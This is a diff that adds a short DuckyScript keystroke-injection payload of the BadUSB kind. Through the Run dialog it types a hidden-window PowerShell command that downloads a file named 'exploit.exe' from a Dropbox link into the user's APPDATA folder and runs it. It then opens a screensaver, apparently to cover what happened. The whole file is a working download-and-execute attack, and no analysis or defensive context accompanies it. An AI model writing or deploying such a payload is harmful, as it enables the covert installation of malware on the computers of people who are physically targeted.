@@ -1,0 +1,10 @@
+
+GUI r
+DELAY 300
+STRING powershell -w 1 cd $env:APPDATA\Microsoft;(new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/j4df76p35dh/exploit.exe','exploit.exe');start "exploit.exe"
+ENTER
+DELAY 10
+GUI r
+DELAY 100
+STRING c:\windows\system32\sstext3d.scr -s
+ENTER
